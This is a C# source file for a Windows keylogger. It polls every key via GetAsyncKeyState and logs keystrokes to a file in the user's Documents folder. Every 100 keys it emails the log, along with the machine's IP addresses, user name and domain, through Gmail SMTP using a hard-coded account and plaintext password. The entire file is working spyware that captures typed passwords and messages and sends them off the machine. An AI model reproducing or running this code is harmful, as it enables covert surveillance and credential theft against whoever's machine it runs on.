using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Threading;

namespace test1
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long numberOfKeyStrokes = 0;
        static void Main(string[] args)
        {
            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            //if(!Directory.Exists(filepath))
            //Directory.CreateDirectory(filepath);

            string path = (filepath + @"\keystrokes.txt");
            if (!File.Exists(path))
                using (StreamWriter sw = File.CreateText(path)) ;

            while (true)
            {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                        numberOfKeyStrokes++;
                        if (numberOfKeyStrokes % 100 == 0)
                        {
                            SendNewMessage();
                        }
                    }
                }
            }
        }

        static void SendNewMessage()
        {
            string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\keystrokes.txt";
            string logContents = File.ReadAllText(filePath);

            DateTime now = DateTime.Now;
            string subject = "Message from keylogger";
            string emailBody = "";

            var host = Dns.GetHostEntry(Dns.GetHostName());
            //string name = host.HostName;
            foreach (var address in host.AddressList)
            {
                emailBody += "\nAddress: " + address;
            }
            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            //emailBody += "\n Host: " + name;
            emailBody += "\n Time: " + now.ToString();
            emailBody += "\n Keys pressed: " + logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("testkeyloggerapp@gmail.com");
            mailMessage.To.Add("testkeyloggerapp@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("testkeyloggerapp@gmail.com", "parolatest1234");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);

        }


    }
}
